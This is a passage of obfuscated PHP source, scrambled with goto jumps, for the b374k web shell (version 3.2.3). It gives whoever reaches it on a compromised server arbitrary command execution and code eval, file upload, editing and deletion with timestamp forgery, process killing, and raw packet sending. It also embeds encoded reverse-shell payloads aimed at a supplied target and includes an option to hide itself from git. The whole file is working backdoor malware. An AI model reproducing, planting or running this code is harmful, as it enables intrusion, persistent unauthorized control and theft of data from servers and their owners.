<?php
 goto M5Xyp; hDK6D: if (!function_exists('get_fileperms')) { function get_fileperms($file) { if ($perms = @fileperms($file)) { goto GTYQW; DWUy6: $flag .= $perms & 040 ? 'r' : '-'; goto oeBcG; mPZfp: $flag .= $perms & 0200 ? 'w' : '-'; goto Is1qt; RO6C1: $flag .= $perms & 04 ? 'r' : '-'; goto cjZqS; GTYQW: $flag = 'u'; goto ftvgA; I5Jtd: $flag .= $perms & 010 ? 'x' : '-'; goto RO6C1; cjZqS: $flag .= $perms & 02 ? 'w' : '-'; goto q5JiH; Is1qt: $flag .= $perms & 0100 ? 'x' : '-'; goto DWUy6; oeBcG: $flag .= $perms & 020 ? 'w' : '-'; goto I5Jtd; Or3RC: return $flag; goto g0i34; ftvgA: if (($perms & 0xc000) == 0xc000) { $flag = 's'; } elseif (($perms & 0xa000) == 0xa000) { $flag = 'l'; } elseif (($perms & 0x8000) == 0x8000) { $flag = '-'; } elseif (($perms & 0x6000) == 0x6000) { $flag = 'b'; } elseif (($perms & 0x4000) == 0x4000) { $flag = 'd'; } elseif (($perms & 0x2000) == 0x2000) { $flag = 'c'; } elseif (($perms & 0x1000) == 0x1000) { $flag = 'p'; } goto BCbho; BCbho: $flag .= $perms & 0400 ? 'r' : '-'; goto mPZfp; q5JiH: $flag .= $perms & 01 ? 'x' : '-'; goto Or3RC; g0i34: } else { return "???????????"; } } } goto gpfON; VLdqn: @ini_set('display_errors', '0'); goto gqzeY; vKALI: $GLOBALS['module']['eval']['js_ontabselected'] = "\nif((!portableMode) && (\$('#evalOutput').html()=='You can also press ctrl+enter to submit')) \$('#evalInput').focus();"; goto n3Xs3; P_3LL: if (!function_exists('send_email')) { function send_email($from, $to, $subject, $msg, $attachment) { goto wt82g; aVgFP: $headers .= "--" . $rand . "\r\n"; goto ZeN_x; jrquV: $headers .= "--" . $rand . "--\r\n"; goto RpZBy; sJMoj: $rand = md5(time()); goto yYCnI; uEybW: if (count($attachment) > 0) { foreach ($attachment as $file) { if (is_file($file)) { goto FNH0G; AyTii: $headers .= "Content-Disposition: attachment\r\n\r\n"; goto fgKrL; fgKrL: $headers .= $content . "\r\n\r\n"; goto PZFkm; YKADc: $headers .= "Content-Transfer-Encoding: base64\r\n"; goto AyTii; FNH0G: $content = chunk_split(base64_encode(read_file($file))); goto wFK0s; wFK0s: $headers .= "--" . $rand . "\r\n"; goto EgA2k; EgA2k: $headers .= "Content-Type: application/octet-stream; name=\"" . basename($file) . "\"\r\n"; goto YKADc; PZFkm: } } } goto jrquV; RpZBy: if (@mail($to, $subject, "", $headers)) { return true; } goto lhbvv; yYCnI: $headers .= "Content-Type: multipart/mixed; boundary=\"" . $rand . "\"\r\n\r\n"; goto aVgFP; wt82g: $headers = "MIME-Version: 1.0\r\n" . $from; goto sJMoj; FJPS5: $headers .= $msg . "\r\n\r\n"; goto uEybW; ZeN_x: $headers .= "Content-Type: text/html; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: 8bit\r\n\r\n"; goto FJPS5; lhbvv: return false; goto m46Ex; m46Ex: } } goto pTOYu; QhL8Q: if (isset($p['decodeStr'])) { $decodeStr = $p['decodeStr']; output(decode($decodeStr)); } goto AlrS4; IASXg: if (!function_exists('sql_num_fields')) { function sql_num_fields($sqltype, $result) { if ($sqltype == 'mysql') { if (class_exists('mysqli_result')) { return $result->field_count; } elseif (function_exists('mysql_num_fields')) { return mysql_num_fields($result); } } elseif ($sqltype == 'mssql') { if (function_exists('sqlsrv_num_fields')) { return sqlsrv_num_fields($result); } elseif (function_exists('mssql_num_fields')) { return mssql_num_fields($result); } } elseif ($sqltype == 'pgsql') { return pg_num_fields($result); } elseif ($sqltype == 'oracle') { return oci_num_fields($result); } elseif ($sqltype == 'sqlite3') { return $result->numColumns(); } elseif ($sqltype == 'sqlite') { return sqlite_num_fields($result); } elseif ($sqltype == 'odbc') { return odbc_num_fields($result); } elseif ($sqltype == 'pdo') { return $result->columnCount(); } } } goto nOj8Y; aAX7l: if (!function_exists('parse_dir')) { function parse_dir($path) { goto TA_LE; XqwGv: if (is_win()) { $res = get_drives() . $res; } goto sxTYn; UlYdB: for ($i = 0; $i < sizeof($paths) - 1; $i++) { $x = ""; for ($j = 0; $j <= $i; $j++) { $x .= $paths[$j] . DIRECTORY_SEPARATOR; } $res .= "<a class='navbar' data-path='" . html_safe($x) . "'>" . html_safe($paths[$i]) . " " . DIRECTORY_SEPARATOR . " </a>"; } goto XqwGv; bfUd2: $paths = explode(DIRECTORY_SEPARATOR, $path); goto PnXiq; TA_LE: $path = realpath($path) . DIRECTORY_SEPARATOR; goto bfUd2; PnXiq: $res = ""; goto UlYdB; sxTYn: return trim($res); goto vWx34; vWx34: } } goto mOY4A; HRUIn: if (!function_exists('show_processes')) { function show_processes() { goto uDYXB; hRMAB: if (is_win()) { $cmd = "tasklist /V /FO csv"; $wexplode = "\",\""; } else { $cmd = "ps aux"; $wexplode = " "; } goto tvCWo; uDYXB: $output = ''; goto ma0NF; tvCWo: $res = execute($cmd); goto C7vFq; C7vFq: if (trim($res) == '') { return false; } else { goto BpXM8; Bkwt6: $check = explode($wexplode, $psarr[0]); goto kUOc7; zqERN: foreach ($psarr as $psa) { if (trim($psa) != '') { if ($fi) { goto H1xEQ; H8Zra: $output .= "<tr><th class='col-cbox sorttable_nosort'><div class='cBoxAll'></div></th><th class='sorttable_nosort'>action</th>"; goto zeDTT; H1xEQ: $fi = false; goto wtuDv; wtuDv: $psln = explode($wexplode, $psa, $wcount); goto H8Zra; lItaD: $output .= "</tr>"; goto wVxH4; zeDTT: foreach ($psln as $p) { $output .= "<th>" . trim(trim(strtolower($p)), "\"") . "</th>"; } goto lItaD; wVxH4: } else { goto Sqv5D; Sqv5D: $psln = explode($wexplode, $psa, $wcount); goto u3iwE; GNexK: $output .= "</tr>"; goto x6MUH; IzK_J: $output .= "<tr data-pid='" . $pid . "'>"; goto tB6Pp; u3iwE: $pid = trim(trim($psln[1]), "\""); goto gDynQ; gDynQ: $tblcount = 0; goto IzK_J; tB6Pp: foreach ($psln as $p) { goto wYz2g; UZ21v: $p = trim(trim($p), "\""); goto GBR92; wYz2g: if (trim($p) == "") { $p = " "; } goto UZ21v; GLsNY: if ($tblcount == 0) { $output .= "<td><div class='cBox'></div></td><td><a class='kill'>kill</a></td><td>" . $p . "</td>"; $tblcount++; } else { $tblcount++; if ($tblcount == count($psln)) { $output .= "<td style='text-align:left;'>" . $p . "</td>"; } else { $output .= "<td style='text-align:center;'>" . $p . "</td>"; } } goto kqWz7; GBR92: $p = html_safe($p); goto GLsNY; kqWz7: } goto GNexK; x6MUH: } } } goto RGKpm; sHDc1: if (!is_win()) { $res = preg_replace('#\\ +#', ' ', $res); } goto c97JE; c97JE: $psarr = explode("\n", $res); goto w3ZwB; w3ZwB: $fi = true; goto LtUXr; kqjPD: $output .= "<tfoot><tr><td><div class='cBoxAll'></div></td><td colspan=" . $colspan . " style='text-align:left;'><span class='button' onclick='kill_selected();' style='margin-right:8px;'>kill selected</span><span class='button' onclick='show_processes();'>refresh</span><span class='psSelected'></span></td></tr></tfoot></table>"; goto DjsUL; RGKpm: $colspan = count($psln) + 1; goto okBC3; LtUXr: $tblcount = 0; goto Bkwt6; kUOc7: $wcount = count($check); goto zqERN; okBC3: $colspanAll = $colspan + 1; goto kqjPD; BpXM8: $output .= "<table id='psTable' class='dataView sortable'>"; goto sHDc1; DjsUL: } goto vbHzz; vbHzz: return $output; goto HJyfT; ma0NF: $wcount = 11; goto hRMAB; HJyfT: } } goto oXDLk; IVc3X: $cwd = html_safe(get_cwd()); goto BrMf5; A59rl: $GLOBALS['module']['convert']['id'] = "convert"; goto XUK8l; pd6S2: echo get_self(); goto UEgIW; xJfUM: $GLOBALS['module']['mail']['title'] = "Mail"; goto z7MjW; bv3H7: $GLOBALS['resources']['rs_perl'] = "lZJhb9MwEIY/17/CZF6bSIG0DAmpJhVVmqFqa1PFHQhRiNL0WKylcRS7rKgrvx0ny2gEQoJ8sO5en56zHuXsmbOTpbPmuQP5N1xAmaEznCpVyKHj3HKV7tYvErF11hevX909nmgnAU+D4ZCJ5A4URURIl3wJdCFT14B9IUqFl344c/cKyi1dsIHbW5HFh8lq1KPNvQ5pvVem+Dk3KOJfzQr0Y+vc65Rbh5p27gUztvC9c+xcGfSIiHJvQRWlUGL9PY+3YPZUUvQsimT9GpPZ3cVlNJ37S7vLAu8qYsvQH89soqyHhw0H06pXvR2H79677sA6oA4pXFK1n/qfKepIUBVKFBWLBddRRdE0FkShf8P88WQS2gNN6ejXb/RMNR1vNmXEc5MU9nReTUTj+UfrtLGTcakg19MXrTBOEtBrPJtZ9WKN82yjloxlClmGhzgReQ6Jgs0qN+x+NScKyDFbTqZz23jT9Qz6FAQ3S9sYtRM/DJsEdWAPCdZOT+uTTEgwPYs+FuxXUbFbjea2Os20ahxXuE8ROiLI5Mnoyz+NkrTpBnXHXZ6DimIltK+0pYPE7m8uCW9dNya0QxK34lob+zdtZqNt1GWGRZ+Sxls7asRV0d/N/ZewWhMcKm2m/nuOSH8/AQ=="; goto dqEKI; JlLmd: foreach ($GLOBALS['module_to_load'] as $k) { echo "<a class='menuitem' id='menu" . $GLOBALS['module'][$k]['id'] . "' href='#!" . $GLOBALS['module'][$k]['id'] . "'>" . $GLOBALS['module'][$k]['title'] . "</a>"; } goto QDQIN; mp55G: if (is_git_repo(getcwd())) { echo "<p class=\"git_alert\">Warning: b374k is running under a git repository!</p>\n\t\t\t\t\t  <a href=\"#\"> Click here to hide b374k from git </a>"; } goto wf11N; z0p3Q: if (!function_exists('get_all_files')) { function get_all_files($path) { goto dAeNd; VAEqd: $files = glob($path . '*'); goto m8NNb; dAeNd: $path = realpath($path) . DIRECTORY_SEPARATOR; goto VAEqd; YGaoY: return $files; goto J2uE0; m8NNb: for ($i = 0; $i < count($files); $i++) { if (is_dir($files[$i])) { $subdir = glob($files[$i] . DIRECTORY_SEPARATOR . '*'); if (is_array($files) && is_array($subdir)) { $files = array_merge($files, $subdir); } } } goto YGaoY; J2uE0: } } goto RvEBT; f6Sxi: echo $GLOBALS['title'] . " " . $GLOBALS['ver']; goto EHCt2; ofgSz: $server_addr = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : ""); goto mbzgL; RTPf5: if (!function_exists('get_fileowner')) { function get_fileowner($file) { goto d6Bvc; PmutM: if (function_exists("posix_getpwuid")) { goto rNiQi; rNiQi: $name = posix_getpwuid(fileowner($file)); goto gy4js; L4kX7: $owner = $name['name'] . ":" . $group['name']; goto gcK_E; gy4js: $group = posix_getgrgid(filegroup($file)); goto L4kX7; gcK_E: } goto vtbBz; d6Bvc: $owner = "?:?"; goto PmutM; vtbBz: return $owner; goto vm9ni; vm9ni: } } goto z9Ca8; RN0d2: $GLOBALS['module']['mail']['id'] = "mail"; goto xJfUM; HWlTd: if (!function_exists('is_win')) { function is_win() { return strtolower(substr(php_uname(), 0, 3)) == "win" ? true : false; } } goto wQXBM; mwXG9: $GLOBALS['module']['terminal']['content'] = "<pre id='terminalOutput'></pre><table id='terminalPrompt'><tr><td class='colFit'><span id='terminalCwd' class='strong'>" . get_cwd() . "&gt;</span</td><td id='terminalCommand'><input type='text' id='terminalInput' class='floatLeft' spellcheck='false'></td></tr></table>"; goto zoJP6; A297u: $GLOBALS['ver'] = "3.2.3"; goto WG5Fc; ek0Hv: $GLOBALS['module']['eval']['title'] = "Eval"; goto vKALI; Mt1Yu: $GLOBALS['resources']['rs_php'] = "7VRNj9s2ED3bv0JRBSyFKrZlFwiwLjeX9lggaAv0kN0KMkWtCEsiy6FqB9397x1+yB8bZzdIg15aGJbIGc6b4czT+/6tatT0m6gxRsH1fH4vTDNsZkx2883qzXdb/5xyraUuNFdSG9Hfk0W6ngI3hREdL1rRCeNMclOITrWCCVPU7QANQeM0MaW+5wYo36tWVpzEUZwFI/oTBjRfrd7galfSfmhbXPHDChoaYyAmjn798eef6N5w3a3f/ZLTq9vk3W8/3Fytgxtt6/lG9HNootcixtiOxq7+CBrettF1xGTfc2Z4ddujfypqwuTQGzKWmFKap39NJ4miwbTGDVYQ27dBONFXuH6c8hb4pfDleTi8X9x5iIMhvxuxSrZ1WLaOeuiZEbIv+F6AAXKlWG/aopZ6e5V6TFHRo9F2doJxzkxf5ynGGZKfWL1lESxKgtgXODMQFUnPI3wFWFK4n0sHFIzmZVeAZFscNXD9J9ckNkwhTxYz97uOZ4nKEqRHL90LY2zCMTRQRA7YI8hWrpiEPUEuGePKHgilotfIVu4wGwwb3BHkaDH0ZcdJmi2yVYr1xzvRu0In9U4Lw0nCsqSbYYfZDi84i29iCzfZNaJFp3pFaV3izFyIHVBth4FR7pTrkOb3RVca1pB4zqrbiLz//Rbuvk3nAumKt9Q69dGTpKoobv0ofbSAohKaoCdNWTMuvTuR9LQuZ3y0j0Aio0V3eutEuRva+cTRw0P0Cf8fA/rTaIO93K5HuAiT8b29MeZCls8+ynzSL+kKtKXUrJXAx3aMOzcRdFvgp612B5MKaKl1+YEs6I1fxEooHmexjtMsf2rcoXF5wejBlKZKS1ZIxXtM3mQIj50XyrmxUa+wy5qDHDSzN8R5HFl/yrlNi8yyOmWD8QvMFs+fyF88sXz2BAtOTzajh0Az+11zWdu2Pjz4lU+XpsepJboMPbR9DeWEpJ5Ah5wtahfB8xkqJX5uZWY18kBg0RdHHF0eyCpojfGVMzMInBxHGRqUiPRIyzOssaBLgKPvI1T2AuDyGcDly4CP5xw9Ie+49Nc63+dP9qG9jnKjWXvGH/Tdi6IV6iCKtRUtT9DGqQLv8T9q25erF3yResF/Vr3gknp9Sq/gf706OwEv6RV8nl7BV9IruKwG8K/pFXxtvYLP0at/LFJvb/4G"; goto xPGnh; XUK8l: $GLOBALS['module']['convert']['title'] = "Convert"; goto ZdRh3; IX9Ms: ?>' />&nbsp;<span id='nav'><?php  goto RXsLh; GmGvp: if (isset($p['cd'])) { goto yi0qY; Q6EsN: $path = realpath($path); goto Uw0w3; yi0qY: $path = $p['cd']; goto SWixg; SWixg: if (trim($path) == '') { $path = dirname(__FILE__); } goto Q6EsN; heJT7: if (is_dir($path)) { goto Uu9C3; Q_WTQ: $path = $path . DIRECTORY_SEPARATOR; goto yvjUh; Uu9C3: chdir($path); goto Q_WTQ; AUSV3: if (isset($p['showfiles']) && $p['showfiles'] == 'true') { $res .= show_all_files($path); } goto UKsrv; tleem: $res = $path . "{[|b374k|]}" . get_nav($path) . "{[|b374k|]}"; goto AUSV3; yvjUh: setcookie("cwd", $path); goto tleem; UKsrv: } else { $res = "error"; } goto QwJH8; QwJH8: output($res); goto Nb7kI; Uw0w3: if (is_file($path)) { $path = dirname($path); } goto heJT7; Nb7kI: } elseif (isset($p['viewFile']) && isset($p['viewType'])) { goto IyVS5; ddFru: if (is_file($path)) { $res = view_file($path, $type, $preserveTimestamp); } else { $res = "error"; } goto G_5OK; G_5OK: output($res); goto iOJWa; hl7TY: $preserveTimestamp = trim($p['preserveTimestamp']); goto ddFru; F0jT2: $type = trim($p['viewType']); goto hl7TY; IyVS5: $path = trim($p['viewFile']); goto F0jT2; iOJWa: } elseif (isset($p['renameFile']) && isset($p['renameFileTo'])) { goto UTBOJ; y3VA4: output($res); goto noYIK; UTBOJ: $renameFile = trim($p['renameFile']); goto DbpM4; LCgHp: if (file_exists($renameFile)) { if (rename($renameFile, $renameFileTo)) { $res = dirname($renameFileTo); } else { $res = "error"; } } else { $res = "error"; } goto y3VA4; DbpM4: $renameFileTo = trim($p['renameFileTo']); goto LCgHp; noYIK: } elseif (isset($p['newFolder'])) { goto y3rzJ; yQ940: output($res); goto DAsfO; H2QKm: if (mkdir($newFolder)) { $res = dirname($newFolder); } else { $res = "error"; } goto yQ940; y3rzJ: $newFolder = trim($p['newFolder']); goto H2QKm; DAsfO: } elseif (isset($p['newFile'])) { goto VB0ei; aq071: output($res); goto MaIM0; ubPG7: if (touch($newFile)) { $res = dirname($newFile); } else { $res = "error"; } goto aq071; VB0ei: $newFile = trim($p['newFile']); goto ubPG7; MaIM0: } elseif (isset($p['delete'])) { goto AfC9w; AfC9w: $path = trim($p['delete']); goto q0Fgt; q0Fgt: $dirname = dirname($path); goto ZVieW; ZVieW: if (is_file($path)) { if (unlink($path)) { $res = $dirname; } } elseif (is_dir($path)) { if (rmdirs($path) > 0) { $res = $dirname; } } else { $res = "error"; } goto j_nX0; j_nX0: if (file_exists($path)) { $res = "error"; } goto IG_9y; IG_9y: output($res); goto pNKXR; pNKXR: } elseif (isset($p['editType']) && isset($p['editFilename']) && isset($p['editInput']) && isset($p['preserveTimestamp'])) { goto zAZtY; XwNy9: if ($editType == 'hex') { $editInput = pack("H*", preg_replace("/\\s/", "", $editInput)); } goto MgBsA; QPlhs: $editType = trim($p['editType']); goto UHLXY; TauBj: output($res); goto UN_AM; UHLXY: $preserveTimestamp = trim($p['preserveTimestamp']); goto PwApb; zAZtY: $editFilename = trim($p['editFilename']); goto XFgYd; XFgYd: $editInput = trim($p['editInput']); goto QPlhs; MgBsA: if (write_file($editFilename, $editInput)) { $res = $editFilename; if ($preserveTimestamp == 'true') { touch($editFilename, $time); } } else { $res = "error"; } goto TauBj; PwApb: $time = filemtime($editFilename); goto XwNy9; UN_AM: } elseif (isset($p['findType'])) { goto SHKQs; MBaTh: if ($findType == 'file') { $candidate = array_filter($candidate, "is_file"); } elseif ($findType == 'folder') { $candidate = array_filter($candidate, "is_dir"); } else { $res = "error"; } goto bu0UO; wCevl: foreach ($candidate as $k) { goto isYIZ; CwPnP: if ($findExecutable == "true") { if (!is_executable($k)) { $candidate = array_diff($candidate, array($k)); } } goto vqVMU; isYIZ: if ($findReadable == "true") { if (!is_readable($k)) { $candidate = array_diff($candidate, array($k)); } } goto TjI3y; TjI3y: if ($findWritable == "true") { if (!is_writable($k)) { $candidate = array_diff($candidate, array($k)); } } goto CwPnP; vqVMU: } goto wC6wA; sEttf: $findContentInsensitive = trim($p['findContentInsensitive']); goto fm9gH; SHKQs: $findType = trim($p['findType']); goto X9Py3; N4mAf: $findNameRegex = trim($p['findNameRegex']); goto jm08d; jm08d: $findNameInsensitive = trim($p['findNameInsensitive']); goto HMh1y; fItiP: output($res); goto eNh8v; wC6wA: if (count($candidate) > 0) { $res = ""; foreach ($candidate as $k) { $res .= "<p><span class='strong'>&gt;</span>&nbsp;<a data-path='" . html_safe($k) . "' onclick='view_entry(this);'>" . html_safe($k) . "</a></p>"; } } else { $res = ""; } goto fItiP; fm9gH: $findReadable = trim($p['findReadable']); goto lFzGi; rbzEZ: $findContentRegex = trim($p['findContentRegex']); goto sEttf; lFzGi: $findWritable = trim($p['findWritable']); goto zB4nj; X9Py3: $findPath = trim($p['findPath']); goto Zk43I; sUN8j: $candidate = get_all_files($findPath); goto MBaTh; HMh1y: $findContent = trim($p['findContent']); goto rbzEZ; zB4nj: $findExecutable = trim($p['findExecutable']); goto sUN8j; bu0UO: foreach ($candidate as $k) { if ($findType == "file" || $findType == "folder") { if (!empty($findName)) { if ($findNameRegex == "true") { $case = $findNameInsensitive == "true" ? "i" : ""; if (!preg_match("/" . $findName . "/" . $case, basename($k))) { $candidate = array_diff($candidate, array($k)); } } else { goto Cyk8w; VxJIv: if ($check) { $candidate = array_diff($candidate, array($k)); } goto YmtOz; Cyk8w: $check = false; goto cwUt6; cwUt6: if ($findNameInsensitive == "true") { $check = strpos(strtolower(basename($k)), strtolower($findName)) === false; } else { $check = strpos(basename($k), $findName) === false; } goto VxJIv; YmtOz: } } } if ($findType == "file") { if (!empty($findContent)) { $content = read_file($k); if ($findContentRegex == "true") { $case = $findContentInsensitive == "true" ? "i" : ""; if (!preg_match("/" . $findContent . "/" . $case, $content)) { $candidate = array_diff($candidate, array($k)); } } else { goto BuIyV; BuIyV: $check = false; goto LuwxT; LuwxT: if ($findContentInsensitive == "true") { $check = strpos(strtolower($content), strtolower($findContent)) === false; } else { $check = strpos($content, $findContent) === false; } goto wZz06; wZz06: if ($check) { $candidate = array_diff($candidate, array($k)); } goto n2IX3; n2IX3: } } } } goto wCevl; Zk43I: $findName = trim($p['findName']); goto N4mAf; eNh8v: } elseif (isset($p['ulType'])) { goto NSmiK; tfnUX: output($res); goto z6HCf; NSmiK: $ulSaveTo = trim($p['ulSaveTo']); goto CzTp1; TRhx9: if ($p['ulType'] == 'comp') { goto DBRVM; VXlOp: if (empty($ulFilename)) { $ulFilename = $ulFile['name']; } goto wAVgJ; wAVgJ: if (is_uploaded_file($ulFile['tmp_name'])) { goto gHXBB; aAXJx: $newfile = realpath($ulSaveTo) . DIRECTORY_SEPARATOR . $ulFilename; goto Hbtwh; gHXBB: if (!is_dir($ulSaveTo)) { mkdir($ulSaveTo); } goto aAXJx; Hbtwh: if (move_uploaded_file($ulFile['tmp_name'], $newfile)) { $res = "<span class='strong'>&gt;</span>&nbsp;<a data-path='" . html_safe($newfile) . "' onclick='view_entry(this);'>" . html_safe($newfile) . "</a>&nbsp;( 100% )"; } else { $res = "error"; } goto JDeZX; JDeZX: } else { $res = "error"; } goto nknT6; DBRVM: $ulFile = $_FILES['ulFile']; goto VXlOp; nknT6: } elseif ($p['ulType'] == 'url') { goto c5e4i; JGGJp: if (!is_dir($ulSaveTo)) { mkdir($ulSaveTo); } goto mo194; c5e4i: $ulFile = trim($p['ulFile']); goto za0Ey; mo194: $newfile = realpath($ulSaveTo) . DIRECTORY_SEPARATOR . $ulFilename; goto QrRVH; QrRVH: if (download($ulFile, $newfile)) { $res = "<span class='strong'>&gt;</span>&nbsp;<a data-path='" . html_safe($newfile) . "' onclick='view_entry(this);'>" . html_safe($newfile) . "</a>&nbsp;( 100% )"; } else { $res = "error"; } goto GQwMv; za0Ey: if (empty($ulFilename)) { $ulFilename = basename($ulFile); } goto JGGJp; GQwMv: } else { $res = "error"; } goto tfnUX; CzTp1: $ulFilename = trim($p['ulFilename']); goto TRhx9; z6HCf: } elseif (isset($p['download'])) { $file = trim($p['download']); if (is_file($file)) { goto RyAI5; KbS_N: header("Cache-Control: no-cache"); goto Untz3; XR2bG: fclose($handler); goto OlCHG; seRPz: header("Content-disposition: attachment; filename=\"" . basename($file) . "\";"); goto xZpuI; xZpuI: $handler = fopen($file, "rb"); goto NQc3o; OlCHG: die; goto nyLeT; tXbrP: header('Content-Transfer-Encoding: binary'); goto baGYQ; RyAI5: header("Content-Type: application/octet-stream"); goto tXbrP; NQc3o: while (!feof($handler)) { print fread($handler, 1024 * 8); @ob_flush(); @flush(); } goto XR2bG; Untz3: header("Pragma: no-cache"); goto seRPz; baGYQ: header("Content-length: " . filesize($file)); goto KbS_N; nyLeT: } } elseif (isset($p['multimedia'])) { goto VqflX; akzsa: $mime_list = get_resource('mime'); goto jzJab; jzJab: $mime = ""; goto wSTTn; wSTTn: $file_ext_pos = strrpos($file, "."); goto iuX2A; iuX2A: if ($file_ext_pos !== false) { $file_ext = trim(substr($file, $file_ext_pos), "."); if (preg_match("/([^\\s]+)\\ .*\\b" . $file_ext . "\\b.*/i", $mime_list, $res)) { $mime = $res[1]; } } goto iOLwe; VqflX: $file = trim($p['multimedia']); goto akzsa; iOLwe: if (is_file($file)) { goto LOn7I; f0UjW: die; goto rU2nE; LOn7I: header("Content-Type: " . $mime); goto PsjaO; fmVld: echo "data:" . $mime . ";base64," . base64_encode(read_file($file)); goto f0UjW; iijTe: header("Content-length: " . filesize($file)); goto fmVld; PsjaO: header('Content-Transfer-Encoding: binary'); goto iijTe; rU2nE: } goto KEKRT; KEKRT: } elseif (isset($p['massType']) && isset($p['massBuffer']) && isset($p['massPath']) && isset($p['massValue'])) { goto b9uDO; xejO8: $massValue = trim($p['massValue']); goto uLozw; ZsJXM: $massBuffer = trim($p['massBuffer']); goto kcWZk; b9uDO: $massType = trim($p['massType']); goto ZsJXM; kcWZk: $massPath = realpath($p['massPath']) . DIRECTORY_SEPARATOR; goto xejO8; nY1ry: if ($massType == 'tar' || $massType == 'targz' || $massType == 'zip') { if (compress($massType, $massValue, $massBufferArr)) { $counter++; return $counter; } } else { foreach ($massBufferArr as $k) { $path = trim($k); if (file_exists($path)) { $preserveTimestamp = filemtime($path); if ($massType == 'delete') { if (is_file($path)) { if (unlink($path)) { $counter++; } } elseif (is_dir($path)) { if (rmdirs($path) > 0) { $counter++; } } } elseif ($massType == 'cut') { $dest = $massPath . basename($path); if (rename($path, $dest)) { $counter++; touch($dest, $preserveTimestamp); } } elseif ($massType == 'copy') { $dest = $massPath . basename($path); if (is_dir($path)) { if (copys($path, $dest) > 0) { $counter++; } } elseif (is_file($path)) { if (copy($path, $dest)) { $counter++; } } } elseif ($massType == 'untar' || $massType == 'untargz' || $massType == 'unzip') { if (decompress($massType, $path, $massValue)) { $counter++; return $counter; } } elseif (!empty($massValue)) { if ($massType == 'chmod') { if (chmod($path, octdec($massValue))) { $counter++; } } elseif ($massType == 'chown') { if (chown($path, $massValue)) { $counter++; } } elseif ($massType == 'touch') { if (touch($path, strtotime($massValue))) { $counter++; } } } } } } goto sql0f; sql0f: if ($counter > 0) { output($counter); } goto fejOY; fejOY: output('error'); goto KWKpP; qagyb: $massBufferArr = explode("\n", $massBuffer); goto nY1ry; uLozw: $counter = 0; goto qagyb; KWKpP: } elseif (isset($p['viewFileorFolder'])) { goto KcYaH; Q6ghb: if (is_file($entry)) { output('file'); } elseif (is_dir($entry)) { output('folder'); } goto wpqy_; wpqy_: output('error'); goto LHmlp; KcYaH: $entry = $p['viewFileorFolder']; goto Q6ghb; LHmlp: } elseif (isset($p['terminalInput'])) { output(html_safe(execute($p['terminalInput']))); } elseif (isset($p['evalInput']) && isset($p['evalType'])) { goto N2EnB; kr2P4: $res = eval_go($evalType, $evalInput, $evalOptions, $evalArguments); goto ufJb3; KG88x: $evalType = $p['evalType']; goto V9fvZ; uqR3O: $evalOptions = isset($p['evalOptions']) ? $p['evalOptions'] : ""; goto GNH1F; N2EnB: $evalInput = $p['evalInput']; goto uqR3O; S6Qfy: output(html_safe($res)); goto YCi41; EXPk3: @ini_set('display_startup_errors', '1'); goto kr2P4; ufJb3: if ($res === false) { $res == "error"; } goto S6Qfy; GNH1F: $evalArguments = isset($p['evalArguments']) ? $p['evalArguments'] : ""; goto KG88x; V9fvZ: error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE); goto qEVkN; qEVkN: @ini_set('html_errors', '0'); goto Lb9Y4; Lb9Y4: @ini_set('display_errors', '1'); goto EXPk3; YCi41: } elseif (isset($p['evalGetSupported'])) { $res = eval_get_supported(); output($res); } goto A59rl; y90hX: $p = array_map("rawurldecode", get_post()); goto IVc3X; tMtJi: $GLOBALS['resources']['mime'] = "dZThdqMgEIX/7zn7DvMC2jZ62t3HmQgaGkepCDFvvxeNis32xx3huwMYmUkwSvcvRWMtIfz+Fbb5CeC0gsvp/Y1iSEARQZGAMoJyBZ9WN/Rpm7ADoUWNrEw+T7TIbmeJLemhgNCUu4EdH2EekLwh47Sd0DcN9fuBX95U19GIpq+RpN946FSudKXziyIfLlC4PHnSn02r4Un05cm3ca2Nnn3yXPRc9NyTN0+jFXV8pXDO63gmBimvw0hQiuJH8ENLMnmS0h8sl9mW74Nmdc9FK8O5vQeC0iyc7fP4kX3w8UUOWwQTekJY2U2fhWJYwZTVuBooAa0hKAXIaJMMibeZLhEeh95dmeQK51ooBJfYHe64axLgMnY1LZoOPPRngg7shneWbyQAhW9sAjvudgtg4cCWW+OQ/EDXmAxFZTTNMTFwjIvHsFemf2FlKyHEFZzZmYrYk+vUysQoQwg0D6480CBmM5dm4H2+tAC+HLoUioMCjYBnsWUtzcAUn85OK3aFELRNTXslhHW+1ek8RWlwLA8+2KYxI7fZzXTKke6Pawcm6IBGR9A3FJsPj4tKeesr3Y156E2lqQ029f5b2IzCPhzWeT1wjh/Q2vLP6yttox+SPsqPR1Ic/ZD0933dKY7SpMFYgla0dsr2SlPGjLvmKgGmRgGbWXNIvIprgnZQt1gew46StkmO2f4RCp9A1DKjlnk6MmHUfLLYdhk+a7tc+cBCww8mbsA3pkNx2j3hxmgr3up9EprkHw=="; goto mMvGx; yIB3K: @clearstatcache(); goto zm_k0; weXrT: $GLOBALS['module']['explorer']['js_ontabselected'] = ""; goto NyTHA; HSGvJ: ?>';
var win = <?php  goto J9bv6; A_Tav: if (isset($p['rsLang']) && isset($p['rsArgs'])) { goto jcmZK; wcvFJ: output(html_safe($res)); goto mq9i8; PW7sH: if ($res === false) { $res == "error"; } goto wcvFJ; QMlac: $res = ""; goto nK1IM; jcmZK: $rsLang = $p['rsLang']; goto pXjlw; nK1IM: if ($rsLang == "php") { $code = get_resource("rs_" . $rsLang); if ($code !== false) { $code = "\$target = \"" . $rsArgs . "\"; ?>" . $code; $res = eval_go($rsLang, $code, "", ""); } } else { $code = get_resource("rs_" . $rsLang); if ($code !== false) { $res = eval_go($rsLang, $code, "", $rsArgs); } } goto PW7sH; pXjlw: $rsArgs = $p['rsArgs']; goto QMlac; mq9i8: } elseif (isset($p['packetTimeout']) && isset($p['packetSTimeout']) && isset($p['packetPort']) && isset($p['packetTimeout']) && isset($p['packetContent'])) { goto PzzoA; TGRnn: output($res); goto b0ANa; OWxf1: $packetPort = (int) $p['packetPort']; goto scCLW; PzzoA: $packetHost = trim($p['packetHost']); goto XkIEy; otwHT: $res = ""; goto be2wu; scCLW: $packetTimeout = (int) $p['packetTimeout']; goto NoG0P; sGypt: if (!$sock) { $res .= "<div class='weak'>"; $res .= html_safe(trim($errStr)) . " (error " . html_safe(trim($errNo)) . ")</div>"; } else { goto rYsuu; WrVMu: $res .= "<tr><td><textarea style='height:140px;min-height:140px;'>" . bin2hex($bin) . 